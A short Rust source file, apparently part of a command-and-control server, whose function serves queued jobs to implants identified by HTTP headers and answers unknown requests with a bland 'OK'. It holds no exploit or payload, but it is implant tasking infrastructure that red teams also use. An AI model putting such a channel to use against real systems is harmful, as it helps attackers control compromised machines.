use axum::http::HeaderMap;
use how_far_types::NetJobList;

use crate::database;


/// Attempts to get command queue for the request
/// Returns Hex encoded JobData OR empty string
pub async fn fetch_queue(request: &HeaderMap) -> anyhow::Result<Vec<u8>> {
    let id = match database::parse_implant_id(request).await? {
        Some(v) => v,
        None => return Ok(b"OK".to_vec()),
    };

    let implant = match database::fetch_implant(id).await? {
        Some(v) => v,
        None => return Ok(b"OK".to_vec()),
    };

    let mut jobs = Vec::new();
    for job in implant.queue {
        match implant.last_check {
            Some(last) => {
                if job.issue_time > last {
                    jobs.push(job.job);
                }
            }
            None => jobs.push(job.job),
        };
    }

    let serialized = postcard::to_allocvec(&NetJobList { jobs })?;

    Ok(serialized)
}
